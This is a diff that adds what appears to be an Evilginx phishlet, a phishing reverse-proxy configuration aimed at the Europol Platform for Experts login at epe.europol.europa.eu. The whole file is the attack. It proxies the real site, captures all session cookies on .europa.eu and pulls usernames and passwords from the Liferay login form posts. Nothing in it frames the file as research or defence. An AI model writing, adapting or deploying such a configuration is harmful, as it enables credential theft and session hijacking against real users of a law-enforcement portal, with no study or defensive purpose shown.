@@ -1,0 +1,21 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'epe.europol', orig_sub: 'epe.europol', domain: 'europa.eu', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'epe.europol.europa.eu', orig_sub: 'epe.europol', domain: 'europa.eu', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.europa.eu'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: '_com_liferay_login_web_portlet_LoginPortlet_login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '_com_liferay_login_web_portlet_LoginPortlet_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'epe.europol.europa.eu'
+  path: '/' 
